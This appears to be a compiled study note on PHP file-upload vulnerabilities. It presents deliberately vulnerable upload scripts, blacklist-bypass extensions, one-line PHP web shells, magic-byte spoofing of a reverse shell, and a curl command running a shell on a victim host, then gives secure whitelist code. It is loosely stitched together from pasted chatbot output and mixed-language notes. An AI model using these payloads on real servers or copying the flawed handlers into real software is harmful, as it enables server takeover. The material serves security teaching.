# PHP File Upload Security - Blacklist Bypass Techniques

## Overview

# 🚨 Unrestricted File Upload

## 📌 Overview
**Unrestricted File Upload** is a web application vulnerability where an application allows users to upload files **without proper validation** of:
- File type
- File extension
- File content
- File size
- File name

This can expose the server and its users to **critical security risks**.

---

## ⚠️ Impact

- 🔴 **System Compromise**  
  Attackers can upload and execute web shells to gain control of the server or access sensitive files.

- 🎣 **Phishing**  
  Malicious pages can be uploaded to deceive legitimate users.

- 🦠 **Malware / Ransomware**  
  Uploaded files may infect the server or end users.

- 💥 **Denial of Service (DoS)**  
  Large or unlimited file uploads can exhaust server storage and resources.

- 🧨 **Defacement & Data Corruption**  
  Attackers may overwrite or modify important application files.

---

## 🛠️ Attack Methods

- 📄 **Uploading Executable Files**  
  Uploading files like:
  - `.php`
  - `.asp`
  - `.exe`  
  which can execute malicious code on the server.

- 📂 **Path Traversal**  
  Using file names such as:
  ```text
  ../../config.php


This document covers PHP file upload vulnerabilities, specifically focusing on blacklist bypass techniques and secure implementation practices.

---

## File Upload Example 1: Basic Blacklist (file-upload3.php)

### Code Implementation

```php
<?php

// Debugging: Uncomment to see POST and FILES arrays
// print_r($_POST);
// print_r($_FILES);

if (isset($_POST['upload'])) {

    // Blacklist of disallowed file extensions
    $notallowed = array('php');

    // Split the filename by "."
    $splitfilename = explode(".", $_FILES["file"]["name"]);

    // Extract the file extension
    $fileextension = end($splitfilename);

    // Check for upload errors or disallowed extensions
    if ($_FILES['file']['error'] || in_array($fileextension, $notallowed)) {
        echo "Please upload a PNG / JPG / GIF";
        die();
    } else {
        echo "Name: " . $_FILES["file"]["name"] . "<br />";
        echo "Size: " . $_FILES["file"]["size"] . "<br />";
        echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

        // Move the uploaded file to the "upload" directory
        // move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

        if (move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"])) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Upload - Blacklist</title>
</head>
<body>

<form action="file-upload3.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>

</body>
</html>
```

### Vulnerabilities

- Only blocks `.php` extension (case-sensitive)
- Vulnerable to various bypass techniques

---

## Blacklist Filters Bypass Techniques

### Common Bypass Methods

Blacklist filters that block certain file extensions (like `.php`) can often be bypassed using variations in case sensitivity, additional extensions, or alternative but executable file extensions related to PHP.

#### 1. Case Variations

- `.PHP`
- `.Php`
- `.pHp`
- `.phP`

**Explanation:** Case-insensitive OS or PHP treats them equally

#### 2. Alternative PHP-related Extensions

- `.inc` (include files)
- `.phar` (PHP Archive)
- `.php3`
- `.php4`
- `.php5`
- `.php6`
- `.pht`
- `.phtml`

**Explanation:** Other PHP executable extensions or archive types

### Summary Table

|Bypass Method|Examples|Explanation|
|---|---|---|
|Case variation|`.PHP`, `.Php`, `.pHp`, `.phP`|Case-insensitive OS or PHP treats them equally|
|Alternative extensions|`.inc`, `.phar`, `.php3`, `.php4`, `.php5`, `.php6`, `.pht`, `.phtml`|Other PHP executable extensions or archive types|

**Important Note:** These variations are all potentially executable by PHP interpreters on the server, so blacklisting only `.php` (case-sensitive or just lowercase) is insufficient to secure file upload systems.

---

## Apache Configuration Analysis

### Configuration File: `/etc/apache2/mods-available/php8.2.conf`

```apache
# Using (?:pattern) instead of (pattern) is a small optimization that
# avoid capturing the matching pattern (as $1) which isn't used here
<FilesMatch ".+\.ph(?:ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Require all denied
</FilesMatch>

# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(?:ar|p|ps|tml)$">
    Require all denied
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_flag engine Off
    </Directory>
</IfModule>
```

### Key Points from Configuration

#### PHP Handler Settings

The regex pattern: `.+\.ph(?:ar|p|tml)$`

**Matches files with extensions:**

- `.php`
- `.phar`
- `.phtml`

#### Files Handled by PHP Source Handler

Files ending with `.phps` are not executable, but raw source code is generally denied.

**Directive:**

```apache
Require all denied
```

#### Files Denied Access Outright

Files with no basename but only extension matching: `^\.ph(?:ar|p|ps|tml)$`

**Examples:** `.php`, `.phar`

#### PHP Scripts Execution Disabled in User Directories

For extra safety, execution is disabled under `/home/*/public_html` by setting:

```apache
php_admin_flag engine Off
```

---

## Security Implications for File Upload

### Executable File Extensions

The server treats `.php`, `.phar`, `.phtml` files as executable PHP scripts.

### Non-Executable but Source Denied

Files with extensions `.phps` are not executable, but raw source code is generally denied.

### Upload Protection Recommendations

Any upload allowing these extensions (`.php`, `.phar`, `.phtml`) can potentially execute PHP code if accessed via the web.

### Risk Assessment

Even `.phar` files pose risks because they can include executable PHP content.

### User Directory Safety

Execution is disabled in user directories for extra safety.

---

## Conclusion

This configuration shows that a blacklist or filter for `.php` extension alone is inadequate protection against malicious file upload because `.phar` and `.phtml` are equally executed as PHP. Security controls must consider all PHP-executable file extensions.

### File Upload Protections Should:

1. **Reject or strictly validate uploads of:**
    
    - `.php`
    - `.phar`
    - `.phtml`
    - And other PHP executable types
2. **Prefer whitelisting safe extensions** (e.g., `.jpg`, `.png`, `.gif`)
    
3. **Store uploads outside web-accessible directories** or disable script execution in upload directories
    
4. **Implement additional content inspection** and sandboxing to mitigate risks
    

This aligns with blacklist bypass techniques using variations of PHP-related extensions to execute code on the server.

---

## File Upload Example 2: Content-Type Blacklist (file-upload4.php)

### Code Implementation

```php
<?php

// Debugging: Uncomment for debugging POST and FILES arrays
// print_r($_POST);
// print_r($_FILES);

if (isset($_POST['upload'])) {

    // Check if there was an error uploading or if MIME type is PHP
    if ($_FILES['file']['error'] || $_FILES["file"]["type"] === "application/x-php") {
        echo "Please upload a PNG / JPG / GIF";
        die();
    } else {
        echo "Name: " . $_FILES["file"]["name"] . "<br />";
        echo "Size: " . $_FILES["file"]["size"] . "<br />";
        echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

        // Move uploaded file to "upload" directory
        // move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

        if (move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"])) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Upload - Blacklist (Content-Type)</title>
</head>
<body>

<form action="file-upload3.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>

</body>
</html>
```

### Vulnerabilities

- Only checks MIME type for `application/x-php`
- MIME type is client-controlled and can be easily spoofed
- Does not validate file extension
- Does not validate actual file content

### Bypass Techniques

1. Modify the `Content-Type` header in the HTTP request
2. Upload a PHP file with a spoofed MIME type (e.g., `image/jpeg`)
3. Use tools like Burp Suite to intercept and modify the request

---

## File Upload Example 3: MIME Content-Type Detection (file-upload5.php)

### Code Implementation

```php
<?php

// print_r($_POST); // Uncomment to debug POST data
// print_r($_FILES); // Uncomment to debug FILES data

if (isset($_POST['upload'])) {

    // Get the temporary filename of the uploaded file
    $file_tmp_name = $_FILES["file"]["tmp_name"];

    // Display detected MIME type of the uploaded file
    echo mime_content_type($file_tmp_name) . "<br />";

    // Check if there was an upload error or file is detected as PHP type
    if ($_FILES['file']['error'] || mime_content_type($file_tmp_name) === "text/x-php") {
        echo "Please upload a PNG / JPG / GIF";
        die();
    } else {
        // Show uploaded file details
        echo "Name: " . $_FILES["file"]["name"] . "<br />";
        echo "Size: " . $_FILES["file"]["size"] . "<br />";
        echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

        // Uncomment below line to move uploaded file to 'upload' directory
        // move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

        // Attempt to move the uploaded file and confirm result
        if (move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"])) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Upload - Blacklist (MIME Content-Type)</title>
</head>
<body>

<!-- File upload form -->
<form action="file-upload4.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>

</body>
</html>
```

### Key Differences from Previous Examples

#### Uses `mime_content_type()` Function

This function detects the MIME type based on the **actual file content** (magic bytes), not just the client-supplied `Content-Type` header.

#### Detection Method

```php
mime_content_type($file_tmp_name)
```

- Reads the file's magic bytes/signature
- More reliable than `$_FILES["file"]["type"]` which is client-controlled

#### Blocked MIME Type

```php
mime_content_type($file_tmp_name) === "text/x-php"
```

- Blocks files detected as PHP scripts

### Vulnerabilities and Limitations

#### 1. Limited MIME Type Blacklist

- Only blocks `text/x-php`
- Doesn't block other PHP-related MIME types like:
    - `application/x-httpd-php`
    - `application/x-php`
    - `text/php`

#### 2. Magic Bytes Can Be Spoofed

While better than client-supplied MIME types, magic bytes can still be manipulated by:

- Prepending valid image headers to PHP code
- Creating polyglot files (valid image + PHP code)
- Using NULL byte injection in older PHP versions

#### 3. Doesn't Validate File Extension

The script doesn't check the file extension, so:

- `shell.php` could potentially be uploaded if magic bytes are spoofed
- File could execute if accessed directly via web browser

#### 4. No Deep Content Inspection

- Doesn't verify entire file content
- Doesn't strip metadata or embedded code
- Doesn't re-encode images

### Bypass Techniques for file-upload5.php

The provided commands create a file with a specific "magic number" intended to mimic a GIF image, followed by the contents of a PHP reverse shell script. The `file` command then attempts to identify the file type based on its magic bytes. Source↗

**What Happens When Running These Commands**

The command:

```
echo -n -e 'GIF87a' > php-reverse-shell-magic.php
```

writes the ASCII string `"GIF87a"` to the beginning of a new file, which is the typical GIF file magic number.

The command:

```
cat php-reverse-shell.php >> php-reverse-shell-magic.php
```

appends the contents of a PHP reverse shell script to that file.

Running:

```
file php-reverse-shell-magic.php
```

asks the `file` utility to identify the file based on its contents, specifically the initial bytes (magic number).

**Outcome and Explanation**

- The resulting file begins with the bytes corresponding to `GIF87a`, which is the header signature for GIF image files.
- Most file identification tools, including the `file` command, use magic numbers at the file's start to guess its type. Because this file begins with the GIF header, the `file` command will likely label it as a GIF file, regardless of the actual contents after the header.

---

**Note:** Yet, attackers may still attempt advanced evasion like using polyglot files or double extensions that may fool MIME detection or server configuration.

[Claude is AI and can make mistakes.  
Please double-check responses.](https://support.anthropic.com/en/articles/8525154-claude-is-providing-incorrect-or-misleading-responses-what-s-going-on)

  # version 6-
  
  <?php

  

// Debug: Uncomment to inspect POST and FILES arrays

// print_r($_POST);

// print_r($_FILES);

  

if (isset($_POST['upload'])) {

// Define allowed file extensions whitelist

$allowed = array('png', 'jpg', 'gif');

// Extract file extension from uploaded file name

$splitfilename = explode(".", $_FILES["file"]["name"]);

echo "<pre>";

print_r($splitfilename); // Debug: Shows parts of file name split by '.'

echo "</pre>";

$fileExtension = end($splitfilename); // Get last element as extension

echo $fileExtension . "<br />"; // Debug: Display the file extension

// Check for upload errors

if ($_FILES['file']['error']) {

echo "Please upload a PNG / JPG / GIF";

die();

} else {

// Check if file extension is in the allowed list

if (in_array(strtolower($fileExtension), $allowed)) {

// Display file info

echo "Name: " . $_FILES["file"]["name"] . "<br />";

echo "Size: " . $_FILES["file"]["size"] . "<br />";

echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

// Move uploaded file to 'upload' directory

move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

echo "File Uploaded Successfully";

} else {

echo "<br />Please upload a PNG / JPG / GIF";

}

}

}

  

?>

  

<!DOCTYPE html>

<html>

<head>

<meta charset="utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>File Upload - Whitelist (File Extension)</title>

</head>

<body>

  

<form action="file-upload6.php" method="POST" enctype="multipart/form-data">

<input type="file" name="file">

<input type="submit" name="upload" value="Upload">

</form>

  

</body>

</html>

Sonnet 4.5


isme hame server misconfigurr karna padega jab usse wo php ki TARAH LEGA 

#### 1. Polyglot File Attack

Create a file that is both a valid image and contains PHP code:

```bash
# Create a polyglot GIF/PHP file
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# OR prepend valid image bytes
cat image.gif shell.php > polyglot.gif
```

The magic bytes detection might identify it as `image/gif` but it can still execute as PHP if the extension is `.php`.

#### 2. Image with Embedded PHP

```php
# Create a valid image with PHP in metadata/comments
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

#### 3. Double Extension

If the server processes files with multiple extensions:

```
shell.php.gif  # Might be detected as GIF but executed as PHP
```

#### 4. Case Sensitivity

Try different MIME type variations that might not be blocked:

- `TEXT/X-PHP`
- `Text/X-Php`

---

## Advanced Bypass: File Magic Number Spoofing to Mimic GIF

### Technique Overview

This technique creates a file with GIF magic bytes at the beginning, making MIME type detection identify it as a GIF image, while the rest of the file contains executable PHP code.

### Step-by-Step Process

#### Step 1: Create File with GIF Magic Number

The command:

```bash
echo -n -e 'GIF87a' > php-reverse-shell-magic.php
```

**Explanation:**

- `echo -n`: Output without trailing newline
- `-e`: Enable interpretation of backslash escapes
- `'GIF87a'`: The ASCII string representing GIF magic number
- `>`: Redirect output to create new file
- Writes the ASCII string `"GIF87a"` to the beginning of a new file

**What is GIF87a?**

- GIF87a is the magic number/file signature for GIF image files
- It's the first 6 bytes that identify a file as GIF format
- All GIF files start with either `GIF87a` or `GIF89a`

#### Step 2: Append PHP Reverse Shell Code

The command:

```bash
cat php-reverse-shell.php >> php-reverse-shell-magic.php
```

**Explanation:**

- `cat`: Read and output file contents
- `php-reverse-shell.php`: Source file containing PHP malicious code
- `>>`: Append (not overwrite) to existing file
- Appends the contents of a PHP reverse shell script to the file created in Step 1

#### Step 3: Verify File Type Detection

The command:

```bash
file php-reverse-shell-magic.php
```

**Explanation:**

- `file`: Utility to identify file type based on magic bytes
- Asks the `file` utility to identify the file based on its contents, specifically the initial bytes (magic number)

**Expected Output:**

```
php-reverse-shell-magic.php: GIF image data
```

The `file` command identifies it as a GIF image because it detects the GIF magic number at the start.

### Outcome and Explanation

#### File Structure

The resulting file has this structure:

```
[GIF87a][PHP reverse shell code]
```

#### Why This Works

1. **The resulting file begins with the bytes corresponding to `GIF87a`**, which is the header signature for GIF image files
    
2. **Most file identification tools**, including the `file` command, use magic numbers at the file's start to guess its type. Because this file begins with the GIF header, the `file` command will likely label it as a GIF file, regardless of the actual contents after the header
    
3. **The original PHP code remains**, but the file is now (mis-)identified as a GIF image on the basis of its magic number
    
4. **If uploaded to a vulnerable application** that only checks MIME type via `mime_content_type()` or similar functions, it will pass as a GIF image
    
5. **If the web server executes `.php` files**, accessing this file via the browser will execute the PHP code, even though it's detected as a GIF
    

#### Security Implications

- **MIME type detection alone is insufficient** for securing file uploads
- **Magic number spoofing bypasses** content-type validation
- **The file is executable** if accessed with a `.php` extension or if the server is configured to execute PHP in uploaded directories
- **Defense requires multiple layers**: extension validation, content inspection, secure storage, and execution prevention

### Important Notes

#### Why This Bypass Works

1. **File type detection is based on initial bytes only** - most tools don't analyze the entire file
2. **Web servers use file extension to determine execution** - if the extension is `.php`, the server will execute it regardless of magic bytes
3. **Content after magic bytes is ignored** by MIME detection but executed by PHP interpreter
4. **No deep content validation** - the validation only checks the file signature, not the entire content

#### Real-World Attack Scenario

```bash
# Attacker creates malicious file
echo -n -e 'GIF89a' > shell.php
cat reverse-shell.php >> shell.php

# File is uploaded to vulnerable site
# MIME detection: image/gif ✓ (passes validation)
# File saved as: upload/shell.php

# Attacker accesses the file
curl http://victim.com/upload/shell.php?cmd=whoami
# Result: PHP code executes, system compromised
```

#### Variations of Magic Number Spoofing

**GIF Variations:**

```bash
# GIF87a (older format)
echo -n -e 'GIF87a' > file.php

# GIF89a (newer format with animation support)
echo -n -e 'GIF89a' > file.php
```

**Other Image Formats:**

```bash
# PNG
echo -n -e '\x89PNG\r\n\x1a\n' > file.php
cat shell.php >> file.php

# JPEG
echo -n -e '\xFF\xD8\xFF\xE0' > file.php
cat shell.php >> file.php

# BMP
echo -n -e 'BM' > file.php
cat shell.php >> file.php
```

#### Detection Methods

File identification tools will show:

```bash
file php-reverse-shell-magic.php
# Output: GIF image data, version 87a

mime_content_type('php-reverse-shell-magic.php')
# Output: image/gif
```

But the file still contains executable PHP code after the magic bytes.

### Comparison of Detection Methods

|Method|Location|Reliability|Can Be Spoofed?|
|---|---|---|---|
|`$_FILES["file"]["type"]`|Client-supplied header|Very Low|Yes (easily)|
|`mime_content_type()`|Server-side magic bytes|Medium|Yes (with effort)|
|`finfo_file()`|Server-side magic bytes|Medium|Yes (with effort)|
|`getimagesize()`|Deep image validation|High|Difficult|
|Extension + Content + finfo|Combined validation|Very High|Very Difficult|

---

## Secure File Upload Best Practices

### 1. Use Whitelisting Instead of Blacklisting

```php
$allowed = array('jpg', 'jpeg', 'png', 'gif');
$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($extension, $allowed)) {
    die("Invalid file type");
}
```

### 2. Validate MIME Type Properly

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowedMimes = array('image/jpeg', 'image/png', 'image/gif');
if (!in_array($mime, $allowedMimes)) {
    die("Invalid file type");
}
```

### 3. Store Files Outside Web Root

```php
$uploadDir = '/var/uploads/'; // Outside public_html
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $filename);
```

### 4. Rename Uploaded Files

```php
$newFilename = uniqid() . '.' . $extension;
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $newFilename);
```

### 5. Disable Script Execution in Upload Directory

Create `.htaccess` in upload directory:

```apache
<FilesMatch "\.ph(?:p[3-7]?|tml|ar)$">
    Require all denied
</FilesMatch>

php_flag engine off
```

### 6. Validate File Content

```php
// For images, verify it's actually an image
if (@getimagesize($_FILES['file']['tmp_name']) === false) {
    die("File is not a valid image");
}
```

### 7. Set Proper File Permissions

```php
chmod($uploadedFile, 0644); // Read/write for owner, read-only for others
```

### 8. Implement File Size Limits

```php
$maxSize = 5 * 1024 * 1024; // 5MB
if ($_FILES['file']['size'] > $maxSize) {
    die("File too large");
}
```

---

## Complete Secure Upload Example

```php
<?php
session_start();

// CSRF token validation
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed");
}

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    
    // 1. File size validation
    $maxSize = 5 * 1024 * 1024; // 5MB
    if ($_FILES['file']['size'] > $maxSize) {
        die("File too large");
    }
    
    // 2. Extension whitelist
    $allowed = array('jpg', 'jpeg', 'png', 'gif');
    $filename = $_FILES['file']['name'];
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    if (!in_array($extension, $allowed)) {
        die("Invalid file type");
    }
    
    // 3. MIME type validation using finfo
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
    finfo_close($finfo);
    
    $allowedMimes = array(
        'image/jpeg',
        'image/png',
        'image/gif'
    );
    
    if (!in_array($mime, $allowedMimes)) {
        die("Invalid MIME type");
    }
    
    // 4. Verify image integrity
    if (@getimagesize($_FILES['file']['tmp_name']) === false) {
        die("File is not a valid image");
    }
    
    // 5. Generate safe filename
    $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
    
    // 6. Upload to secure directory (outside web root)
    $uploadDir = '/var/secure_uploads/';
    $destination = $uploadDir . $newFilename;
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
        // 7. Set secure permissions
        chmod($destination, 0644);
        
        // 8. Log the upload
        error_log("File uploaded: $newFilename by user " . $_SESSION['user_id']);
        
        echo "File uploaded successfully";
    } else {
        die("Upload failed");
    }
} else {
    die("No file uploaded or upload error");
}
?>
```

---

## Testing and Penetration Testing Tools

### Tools for Testing File Upload Vulnerabilities

- **Burp Suite**: Intercept and modify requests
- **OWASP ZAP**: Automated security testing
- **PHP Shell**: Test if uploaded file executes
- **Weevely**: Generate obfuscated PHP shells

### Common Attack Vectors to Test

1. Extension manipulation (`.php`, `.phtml`, `.php5`, etc.)
2. MIME type spoofing
3. Double extensions (`.jpg.php`)
4. Null byte injection (`.php%00.jpg`)
5. Path traversal (`../../shell.php`)
6. Polyglot files (valid image + PHP code)

---

## References and Further Reading

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PHP Manual: Handling File Uploads](https://www.php.net/manual/en/features.file-upload.php)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

## Notes

- Always use multiple layers of validation
- Never trust client-side validation alone
- Keep PHP and web server updated
- Monitor upload directories for suspicious files
- Implement rate limiting to prevent abuse
- Consider using a dedicated file storage service (AWS S3, etc.)

---

_Document created for educational and security awareness purposes._ _Last updated: October 2025_